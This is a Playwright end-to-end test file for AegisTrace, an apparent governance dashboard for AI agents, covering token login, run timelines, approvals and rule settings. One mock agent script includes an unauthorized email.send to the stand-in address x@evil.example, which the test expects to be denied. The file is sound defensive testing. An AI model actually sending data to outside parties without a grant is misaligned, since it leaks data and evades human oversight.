// SPDX-License-Identifier: FSL-1.1-ALv2
// Copyright 2026 AegisTrace contributors
// Runs against the live compose stack. Requires AEGIS_TOKEN (see scripts/dev_bootstrap.py).
import { expect, test } from "@playwright/test";
import { AegisClient } from "@aegistrace/sdk";

const token = process.env.AEGIS_TOKEN ?? "";
const api = new AegisClient({ baseUrl: process.env.AEGIS_API_URL ?? "http://127.0.0.1:8000", token });

test.skip(!token, "AEGIS_TOKEN not set");

async function login(page: import("@playwright/test").Page) {
  await page.goto("/login");
  await page.getByLabel("Access token").fill(token);
  await page.getByRole("button", { name: "Sign in" }).click();
  await expect(page.getByRole("heading", { name: "Overview" })).toBeVisible();
}

test("rejects a bad token and does not expose the token to scripts", async ({ page, context }) => {
  await page.goto("/login");
  await page.getByLabel("Access token").fill("not-a-token");
  await page.getByRole("button", { name: "Sign in" }).click();
  await expect(page.getByText("Token rejected by the API.")).toBeVisible();
  // The browser can only reach allowlisted routes through the proxy.
  expect((await page.request.get("/api/aegis/v1/admin/anything")).status()).toBe(403);
  await login(page);
  const cookie = (await context.cookies()).find((c) => c.name === "aegis_token");
  expect(cookie?.httpOnly).toBe(true);
  expect(cookie?.sameSite).toBe("Strict");
  expect(await page.evaluate(() => document.cookie)).not.toContain("aegis_token");
});

test("run timeline, integrity status, and approval inbox reflect real state", async ({ page }) => {
  const project = await api.createProject(`pw-${Date.now()}`);
  const agent = await api.registerAgent(project.id, "pw-agent");
  await api.grantTool(agent.id, "calc.add", 0);
  await api.grantTool(agent.id, "data.export", 3);
  const { id } = await api.submitRun(agent.id, { task: "pw", mock_script: [
    { tool: "calc.add", args: { a: 1, b: 1 } },
    { tool: "email.send", args: { to: "x@evil.example", subject: "s", body: "b" } },
    { tool: "data.export", args: { dataset: "pw", destination: "s3.pw", classification: "INTERNAL" } },
    { final: "ok" },
  ] });
  expect((await api.waitForRun(id, 30_000)).state).toBe("WAITING_FOR_APPROVAL");

  await login(page);
  await page.goto(`/runs/${id}`);
  await expect(page.getByText("email.send — denied (no matching grant)")).toBeVisible();
  await expect(page.getByText("waiting on you").first()).toBeVisible();
  await page.getByRole("tab", { name: "evidence" }).click();
  await expect(page.getByText("Chain intact and signed")).toBeVisible();

  await page.goto("/approvals");
  const card = page.locator("li", { hasText: id });
  await expect(card).toContainText("data.export");
  await card.getByRole("button", { name: "Approve this exact action" }).click();
  await expect(page.locator("li", { hasText: id })).toHaveCount(0);
  expect((await api.waitForRun(id, 30_000)).state).toBe("SUCCEEDED");

  await page.goto("/security");
  await expect(page.getByRole("cell", { name: "no matching grant" }).first()).toBeVisible();

  // Policy simulator and grant management are live against the API.
  await page.goto("/agents");
  await page.getByRole("button", { name: /pw-agent/ }).first().click();
  await page.getByRole("button", { name: "Evaluate" }).click();
  await expect(page.getByText("Denied", { exact: true })).toBeVisible();
});

test("organization rules: change, see the effect, save, and view the report", async ({ page }) => {
  await login(page);
  await page.goto("/rules");
  await page.getByRole("button", { name: "Strict" }).click();
  await expect(page.getByText("You have unsaved changes")).toBeVisible();
  await page.getByRole("button", { name: "Discard" }).click();
  await expect(page.getByText("You have unsaved changes")).toHaveCount(0);

  await page.getByRole("radio", { name: /Irreversible only/ }).click();
  await page.getByRole("button", { name: "Save rules" }).click();
  await expect(page.getByText(/Rules saved/)).toBeVisible();
  await expect(page.getByText("Rules updated").first()).toBeVisible();

  await page.goto("/insights");
  await expect(page.getByText(/Healthy|Worth a look|Needs attention/).first()).toBeVisible();
  await expect(page.getByRole("button", { name: "Download report" })).toBeEnabled();
  // restore defaults for other tests
  await page.goto("/rules");
  await page.getByRole("button", { name: /^Balanced/ }).click();
  const save = page.getByRole("button", { name: "Save rules" });
  if (await save.isVisible()) await save.click();
});
